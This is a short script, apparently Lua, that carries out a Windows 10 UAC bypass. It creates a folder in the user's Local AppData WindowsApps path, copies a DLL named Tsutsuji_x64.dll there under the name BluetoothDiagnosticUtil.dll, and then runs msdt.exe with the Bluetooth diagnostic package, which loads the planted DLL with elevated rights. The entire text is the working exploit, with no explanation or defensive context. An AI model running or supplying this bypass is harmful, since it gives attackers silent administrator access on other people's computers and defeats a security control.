-- autoelavate UAC bypass only on Windows 10.
is.popen("c:\windows\system32\cmd.exe /c 'mkdir %appdata%\..\Local\Microsoft\WindowsApps'")
is.popen("c:\windows\system32\cmd.exe /c 'copy Tsutsuji_x64.dll %appdata%\..\Local\Microsoft\WindowsApps\BluetoothDiagnosticUtil.dll'")
is.popen("c:\windows\system32\cmd.exe /c 'c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes'")
